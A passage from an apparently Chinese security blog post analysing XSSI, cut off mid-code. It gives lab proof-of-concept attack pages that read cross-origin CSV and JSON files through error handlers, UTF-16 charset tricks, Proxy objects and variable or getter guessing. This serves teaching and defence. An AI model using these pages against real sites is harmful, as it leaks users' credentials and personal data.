+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="built_in">Function</span>.prototype.call = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> funcString = <span class="keyword">this</span>.toString();</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> emails = /<span class="keyword">var</span> emails = \[(.*)\]/g.exec(funcString)[<span class="number">1</span>];</span></span><br><span class="line"><span class="undefined">		alert(emails);</span></span><br><span class="line"><span class="undefined">	&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里就不通过Jquery往标签中写内容了，因为这里污染了Function的原型链会让Jquery在执行时报错。修改成弹框显示就好：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/24.png" alt=""></p>
+<h3 id="针对非JavaScript类型文件"><a href="#针对非JavaScript类型文件" class="headerlink" title="针对非JavaScript类型文件"></a>针对非JavaScript类型文件</h3><p>某些场景下，目标文件并未JS类型，包含敏感信息的文件，其中的内容并不能直接作为一个JS变量的值读取，或者文件内容是多行的，这些都会使得XSSI的信息窃取变得很困难。</p>
+<p>下面先看下之前wooyun的文章中说到的方法，但都有些历史了，这里本地测试下看看是否还能成功。其中涉及到的文件类型包括CSV、JSON等。</p>
+<h4 id="IE-bug导致错误信息泄漏"><a href="#IE-bug导致错误信息泄漏" class="headerlink" title="IE bug导致错误信息泄漏"></a>IE bug导致错误信息泄漏</h4><p>这种方法的局限性在于ie的版本要小于10，且目前的Chrome和Firefox都不能成功利用。除此之外，获取的CSV中的内容只能获取第一行、第二列的内容，并不能全部获取得到。</p>
+<blockquote>
+<p>为了防止js错误信息跨域泄漏，对于外部加载的js文件，现在主流的浏览器只有固定的错误信息，比如“script error”，但是在ie9与ie10，情况不一定如此。</p>
+<p>一般来说，在外部js发生语法错误的情况下，浏览器只会提供固定的错误信息，但是当在runtime发生错误的情况下，浏览器会提供详细的错误信息。比如”foo 未定义”之类的，某些浏览器一旦允许外域js回复详细的错误信息，就会导致信息泄漏。</p>
+<p>就是说，当某个网页的内容能被js识别为javascript格式的话，那么就可能通过错误信息获取到目标的内容。</p>
+</blockquote>
+<p>假设目标服务端存在包含敏感信息的a.csv：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name,age,address</span><br><span class="line">mi1k7ea,6,china</span><br></pre></td></tr></table></figure>
+<p>用软件打开就是这样的：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/11.png" alt=""></p>
+<p>xssi.html，设置window.error的错误显示：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- set an error handler --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;alert(err)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在ie 8上攻击利用，可以看到会显示CSV文件的第一行、第二列的内容：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/12.png" alt=""></p>
+<p>出现这种情况的原因在于，浏览器将目标CSV文件内容识别为JavaScript，其中age被识别为某个未定义的JS变量。当为这种情况的时候，浏览器就允许页面捕捉来自不同网页的错误信息。</p>
+<p>在Chrome和Firefox，以及10版本以上的ie都不能成功。比如Firefox中并不会弹框，而是直接被浏览器拦截了获取CSV类型的响应：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/13.png" alt=""></p>
+<h4 id="UTF-16编码窃取敏感信息"><a href="#UTF-16编码窃取敏感信息" class="headerlink" title="UTF-16编码窃取敏感信息"></a>UTF-16编码窃取敏感信息</h4><p>这种方法突破了前面只能对CSV信息进行窃取的尴尬局面，但局限性和前面的方法一样，仅在ie &lt; 10的版本下才能成功利用，因为ie 10会拒绝将没有空字节活着bom的编码为UTF-16。</p>
+<p>这种方法的原理如下：</p>
+<blockquote>
+<p>使用<code>script</code>标签的<code>charset</code>属性将包含的文件编码为UTF-16，其目的在于强制文件的所有内容连为一体，变为一个未定义的Javascript变量。然后通过在window域内使用<code>onerror</code>捕获错误信息（此错误信息一定为<code>已编码的文件内容 is not defined</code>），再进行解码即可。此举其实是为了防止符号会引起Javascript出现其他异常，例如英文逗号会截断文件内容，报错只会显示逗号前的内容未定义；而中文逗号则会直接提示非法字符，从而获取不到任何敏感信息。</p>
+</blockquote>
+<p>a.json，假设的目标服务端保存着敏感数据的Json文件：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"username"</span>:<span class="string">"admin"</span>, <span class="attr">"token"</span>:<span class="string">"89uki4gk9iu9213trju"</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>xssi.html，在script标签中加入charset=”UTF-16BE”，同时通过window.error来捕获错误信息并弹框显示出来：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- set an error handler --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;alert(err)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target JSON --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/a.json"</span> <span class="attr">charset</span>=<span class="string">"UTF-16BE"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本地使用ie 8进行测试，弹框显示一段乱码内容，并识别该乱码为JS变量未定义：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/7.png" alt=""></p>
+<p>乱码内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">笢畳敲湡浥∺≡摭楮∬•瑯步渢㨢㠹畫椴杫㥩甹㈱㍴牪產</span><br></pre></td></tr></table></figure>
+<p>将这堆乱码再进行UTF-16BE编码等操作即可获取到原始内容·：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/8.png" alt=""></p>
+<p>注意，这种方式成功的前提在于浏览器是否会将编码后的内容识别为JS的变量，若不能则无法利用成功。除了IE 10以上的版本，在当前的Chrome和Firefox中都是不能成功的，这是因为浏览器并未将编码后的内容识别为JS变量，自然而然地也就无法从window.error中捕获到乱码信息了：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/9.png" alt=""></p>
+<p>下图是引自wooyun文章，能够被浏览器认定为有效的JS变量，当字符编码为UTF-16的时候的数字字母组合，ie 9将其99.3%认为是有效的js标示符，高于Chrome和Firefox：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/10.png" alt=""></p>
+<h4 id="Harmony-proxy-bug-in-Firefox-Chrome"><a href="#Harmony-proxy-bug-in-Firefox-Chrome" class="headerlink" title="Harmony proxy bug in Firefox / Chrome"></a>Harmony proxy bug in Firefox / Chrome</h4><blockquote>
+<p>Harmony是一个ECMAScript 6中的新功能，类似于Java的反射类，其中定义了对于对象属性的查找、分配、函数调用，在我们针对这些新特性的研究过程中发现该功能可以用于XSSI的攻击中。</p>
+</blockquote>
+<p>注意，这种方法在当前较新版本的Chrome和Firefox中都以失效。</p>
+<p>和前面一样的a.csv：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name,age,address</span><br><span class="line">mi1k7ea,6,china</span><br></pre></td></tr></table></figure>
+<p>xssi.html，其中<code>window.__proto__</code>定义了一个代理对象，当访问一个未定义的全局变量，就会出发handler进行处理：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- set proxy handler to window.__proto__ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> handler = &#123;</span></span><br><span class="line"><span class="actionscript">		has: <span class="function"><span class="keyword">function</span><span class="params">(target, name)</span> </span>&#123;alert(<span class="string">"data="</span> + name); <span class="keyword">return</span> <span class="literal">true</span>&#125;,</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">get</span>: <span class="function"><span class="keyword">function</span><span class="params">(target, name)</span> </span>&#123;<span class="keyword">return</span> <span class="number">1</span>&#125;</span></span><br><span class="line"><span class="undefined">	&#125;;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">window</span>.__proto__ = <span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, handler);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在本地测试没成功，显示不能给该对象设置prototype：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/14.png" alt=""></p>
+<h4 id="穷举搜索"><a href="#穷举搜索" class="headerlink" title="穷举搜索"></a>穷举搜索</h4><p>穷举搜索简单地说就是在客户端使用某些方法来暴力破解目标文件中的敏感数据，分为下面三种类型。</p>
+<h5 id="定义变量穷举CSV内容"><a href="#定义变量穷举CSV内容" class="headerlink" title="定义变量穷举CSV内容"></a>定义变量穷举CSV内容</h5><p>此方法适用于当前所有IE版本。</p>
+<p>在前面IE Bug小节中说到了利用IE的Bug可以获取CSV中的第一行第二列的内容，这是因为IE浏览器将该内容当成JS变量然后报错显示错误信息导致信息泄露。现在这种方法的原理在于，我们在恶意页面中就穷举定义CSV中可能存在的项的内容，如果穷举成功、定义了该CSV项的值的变量，那么浏览器就不会报错，证明我们穷举成功。</p>
+<p>在前面的基础上，我们可以通过定义变量的方式来穷举CSV中的所有内容（这里数值无法定义变量也就无法穷举出其值），同时也解决了一般情况下浏览器不提供详细的外部错误信息的问题，这样，即使在最新版的IE 11也能够成功进行利用。</p>
+<p>假设a.csv如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name,age,address</span><br><span class="line">mi1k7ea,6,china</span><br></pre></td></tr></table></figure>
+<p>xssi.html，先啥变量都不定义：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时会报age未定义，也就是CSV中的第一行第二列的内容，和前面的一样：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/16.png" alt=""></p>
+<p>接着，修改xssi.html，添加age变量的定义：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> age = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>此时发现和前面的报错是一样的。没关系，我们直接修改xssi.html，添加age前面的name的变量的定义，发现报错信息就会往后识别了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> name = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> age = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/04/浅析XSSI漏洞/17.png" alt=""></p>
+<p>根据这个原理，我们就可以对CSV文件中的每一项的内容进行穷举，直至浏览器无报错时即穷举完成：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> name = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> age = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> address = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> mi1k7ea = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> china = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/04/浅析XSSI漏洞/18.png" alt=""></p>
+<p>值得注意的是，CSV中的项若为数值，则无需我们定义该数值的变量、也无法定义该变量，换句话说，这种方式除了CSV中的数值项、其他的全部内容都能够被成功穷举出来。</p>
+<h5 id="JS-getter穷举CSV内容"><a href="#JS-getter穷举CSV内容" class="headerlink" title="JS getter穷举CSV内容"></a>JS getter穷举CSV内容</h5><p>原理和上一小节定义变量大同小异，只是借助了JavaScript的getter方法来实现。</p>
+<p>此方法同样适用于当前所有IE版本。</p>
+<p>a.csv如上。</p>
+<p>xssi.html，穷举过程和前面的类似，这里先对CVS中的几项进行定义穷举：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"name"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=name"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"age"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=age"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"address"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=address"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>要是文件中每一项的内容被定义成功，则会逐个弹框显示出来，并且浏览器最后会报错有些像还未定义，当然显不显示具体的未定义的项的内容得看浏览器：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/19.png" alt=""></p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/20.png" alt=""></p>
+<p>接着和前面小节一样，继续通过JS的getter来穷举出CSV文件内容中的其他项即可：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"name"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=name"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"age"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=age"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"address"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=address"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"mi1k7ea"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=mi1k7ea"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"china"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=china"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>此时穷举完成，浏览器也没有报错，说明CSV文件中的每一项均已被定义穷举（当然，数值项是无法通过定义穷举到的，这个缺点和前面小节是一样的）：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/21.png" alt=""></p>
+<h5 id="结合VBScript穷举JSON数组"><a href="#结合VBScript穷举JSON数组" class="headerlink" title="结合VBScript穷举JSON数组"></a>结合VBScript穷举JSON数组</h5><p>注意：VBScript只适用于IE中。此方法在我本地的IE 11中测试并不成功，而在IE 8上OK。</p>
+<p>假设服务端存在包含敏感信息的文件a.json：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"admin"</span>,<span class="string">"this_is_password"</span>]</span><br></pre></td></tr></table></figure>
+<p>xssi.html，这里script标签添加language属性值为vbscript，其中模拟穷举JSON数组内容进行暴力破解：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"vbscript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	Sub [<span 